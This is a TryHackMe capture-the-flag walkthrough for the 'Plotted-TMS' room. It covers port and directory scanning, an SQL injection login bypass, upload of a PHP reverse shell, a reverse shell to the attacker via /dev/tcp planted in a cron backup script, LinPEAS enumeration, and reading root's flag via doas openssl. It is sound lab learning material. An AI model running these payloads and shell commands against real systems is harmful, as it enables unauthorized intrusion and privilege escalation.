# Plotted-TMS

**Room Link:** [https://tryhackme.com/room/plottedtms](https://tryhackme.com/room/plottedtms)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>



### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>



### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

### TCP/445 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:445 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```







<figure><img src="../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>



```
Username: admin' or '1'='1'-- -
Password: admin
```

<figure><img src="../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>





## Initial Shell

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cp php-reverse-shell/php-reverse-shell.php .
subl php-reverse-shell.php
```



<figure><img src="../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```







<figure><img src="../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
rm -f /var/www/scripts/backup.sh 
echo '#!/bin/bash' > /var/www/scripts/backup.sh 
echo "sh -i >& /dev/tcp/$KALI/1338 0>&1" >> /var/www/scripts/backup.sh 
chmod +x /var/www/scripts/backup.sh
cat /var/www/scripts/backup.sh 
```

**Kali**

```
nc -lvnp 1338
```

<figure><img src="../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



#### LinPeas

**Kali**

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
wget http://$KALI:81/linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
```

<figure><img src="../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

###

## Privilege Escalation

### Option #1&#x20;

**Victim**

```
LFILE=/root/root.txt
doas -u root openssl enc -in "$LFILE"
```

<figure><img src="../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

### Option #2&#x20;

**Victim**

```
LFI
```















